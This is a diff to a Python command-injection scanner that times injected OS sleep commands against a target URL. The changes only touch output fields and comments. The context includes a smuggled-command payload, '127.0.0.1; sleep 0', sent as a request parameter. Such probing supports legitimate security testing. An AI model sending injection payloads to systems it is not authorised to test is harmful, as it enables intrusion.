@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """Command injection via sleep-based timing — inject OS sleep commands and measure delay.
 
-Output: schema_version 2 (measurements only, no status/confidence).
+Output: measurements only; no status or confidence.
 Exit codes: 0 = probes completed.
 """
 
@@ -118,13 +118,12 @@ def main():
             "delta_ms": delta,
         })
 
-    # Step 3: Control — inject sleep(0) to confirm syntax is accepted without delay
+    # Step 3: Control — send sleep(0) and record its raw timing and status
     probe_count += 1
     control_round = make_request(TARGET_URL, PARAM, "127.0.0.1; sleep 0", METHOD, headers)
     print(f"[CONTROL] {control_round['elapsed_ms']}ms, status={control_round['status_code']}", file=sys.stderr)
 
     result = {
-        "schema_version": 2,
         "vuln_type": "cmdi",
         "technique": "command_injection",
         "started_at": started_at,
